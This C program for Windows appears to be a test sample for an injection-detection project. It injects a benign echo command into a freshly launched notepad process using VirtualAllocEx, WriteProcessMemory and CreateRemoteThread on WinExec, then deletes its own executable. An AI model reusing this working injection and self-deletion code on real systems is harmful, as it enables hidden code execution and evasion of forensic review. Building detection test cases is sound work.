#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "user32.lib")

#define TARGET_PROC "notepad.exe"
#define DUMMY_TEXT "ARGUS fileless injection test"
#define CMD_PAYLOAD "cmd.exe /c echo " DUMMY_TEXT " > C:\\fyp_test\\fileless_cmd.txt && timeout 2"

void cleanup() {
    Sleep(2000);
    char self[260]; GetModuleFileNameA(NULL, self, 260); 
    DeleteFileA(self);
    DeleteFileA("C:\\fyp_test\\fileless_cmd.txt");
    RemoveDirectoryA("C:\\fyp_test\\"); 
    ExitProcess(0);
}

DWORD find_notepad_pid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    
    if (Process32First(snapshot, &pe)) {
        do {
            if (!strcmp(pe.szExeFile, TARGET_PROC)) {
                pid = pe.th32ProcessID; break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return pid;
}

void fileless_cmd_injection(DWORD notepad_pid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notepad_pid);
    if (!hProcess) return;
    
    SIZE_T payload_size = strlen(CMD_PAYLOAD) + 1;
    LPVOID mem = VirtualAllocEx(hProcess, NULL, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    // Write cmd.exe payload to notepad memory (fileless)
    WriteProcessMemory(hProcess, mem, CMD_PAYLOAD, payload_size, NULL);
    
    // Execute via remote thread (triggers INJECTED_INTO edge)
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                       (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec"), 
                                       mem, 0, NULL);
    
    WaitForSingleObject(hThread, 4000);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE h2, LPSTR lp, int n) {
    CreateDirectoryA("C:\\fyp_test\\", NULL);
    
    // Launch notepad (our injection target)
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)TARGET_PROC, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // Inject fileless CMD immediately
    fileless_cmd_injection(pi.dwProcessId);
    
    ResumeThread(pi.hThread);
    WaitForSingleObject(pi.hProcess, 3000);
    
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    cleanup();
    return 0;
}